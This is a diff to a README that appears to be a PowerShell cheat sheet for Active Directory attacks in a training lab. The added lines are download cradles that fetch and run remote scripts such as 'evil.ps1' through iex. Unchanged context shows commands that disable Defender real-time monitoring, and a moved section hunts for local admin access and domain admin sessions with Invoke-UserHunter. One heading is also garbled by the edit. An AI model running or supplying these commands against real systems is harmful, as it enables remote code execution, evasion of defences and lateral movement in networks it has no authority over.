@@ -10,7 +10,7 @@ This repository contains various PowerShell commands and scripts used for domain
 C:\Users\Naveen>cmd /c "hostname & whoami & ipconfig & whoami /priv"
 ```
 
-### Get Domain Information Using PowerShell
+### "Native executables and .NET classes:
 
 ```powershell
 PS C:\Users\student157> [System.Net.Dns]::GetHostByName(($env:computerName))
@@ -81,27 +81,6 @@ Set-MpPreference -DisableRealtimeMonitoring $true
   ```powershell
   powershell -encodedcommand <encoded_command>
   ```
-
-## 6. Finding Local Admin Access
-
-### Enumerate Local Admin Access
-
-```powershell
-PS C:\AD\Tools> Find-LocalAdminAccess -Verbose
-PS C:\AD\Tools> Invoke-CheckLocalAdminAccess -ComputerName dcorp-stud157.dollarcorp.moneycorp.local
-PS C:\AD\Tools> . .\Find-WMILocalAdminAccess.ps1
-PS C:\AD\Tools> Find-WMILocalAdminAccess -ComputerFile .\computers.txt
-```
-
-### Checking for Domain Admin Sessions
-
-```powershell
-PS C:\AD\Tools> Invoke-UserHunter -Verbose   
-PS C:\AD\Tools> Invoke-UserHunter -Verbose -GroupName "rdpusers"
-PS C:\AD\Tools> Invoke-UserHunter -CheckAccess
-PS C:\AD\Tools> Invoke-UserHunter -stealth
-```
-
 ### Enumerate Sessions on Any Machine
 
 ```powershell
@@ -121,6 +100,34 @@ PS C:\AD\Tools> Get-NetSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local
 
 ```powershell
 $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex $h.responseText
+iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
+$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
+PSv3 onwards:  -iex (iwr 'http://192.168.230.1/evil.ps1')
+$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex $h.responseText
+
+$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
+$r = $wr.GetResponse()
+IEX ([System.IO.StreamReader] ($r.GetResponseStream())).ReadToEnd()
+```
+
+## 6. Finding Local Admin Access
+
+### Enumerate Local Admin Access
+
+```powershell
+PS C:\AD\Tools> Find-LocalAdminAccess -Verbose
+PS C:\AD\Tools> Invoke-CheckLocalAdminAccess -ComputerName dcorp-stud157.dollarcorp.moneycorp.local
+PS C:\AD\Tools> . .\Find-WMILocalAdminAccess.ps1
+PS C:\AD\Tools> Find-WMILocalAdminAccess -ComputerFile .\computers.txt
+```
+
+### Checking for Domain Admin Sessions
+
+```powershell
+PS C:\AD\Tools> Invoke-UserHunter -Verbose   
+PS C:\AD\Tools> Invoke-UserHunter -Verbose -GroupName "rdpusers"
+PS C:\AD\Tools> Invoke-UserHunter -CheckAccess
+PS C:\AD\Tools> Invoke-UserHunter -stealth
 ```
 
 ## 8. Language Modes in PowerShell
